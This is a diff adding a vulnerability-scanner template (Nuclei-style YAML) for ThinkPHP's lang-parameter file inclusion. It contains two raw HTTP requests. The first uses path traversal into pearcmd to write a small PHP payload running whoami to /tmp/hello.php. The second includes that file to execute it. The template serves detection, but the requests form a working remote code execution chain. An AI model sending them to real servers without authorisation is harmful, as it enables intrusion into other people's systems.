@@ -1,0 +1,47 @@
+id: thinkphp-lang-command-execution
+
+info:
+  name: ThinkPHP index.php lang parameter command execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    ThinkPHP is a PHP-based lightweight web application development framework. If the multi-language function is enabled, attackers can exploit the `lang` parameter to achieve directory traversal, file inclusion, and execute arbitrary commands.
+  tags: command-execution, file-inclusion
+
+variables:
+  payload_cmd: "<?=`whoami`;@unlink(__FILE__);?>"
+  payload_phpinfo: "<?=phpinfo();@unlink(__FILE__);?>"
+
+http:
+  - raw:
+      - |
+        GET /public/index.php?lang=../../../../../../../../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/{{payload_cmd}}+/tmp/hello.php HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - CONFIGURATION
+          - "/tmp/hello.php"
+
+  - raw:
+      - |
+        GET /public/index.php?lang=../../../../../../../../../../../../../../../tmp/hello HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "#PEAR_Config"
+          - "PHP Version"
+          - "PHP API"
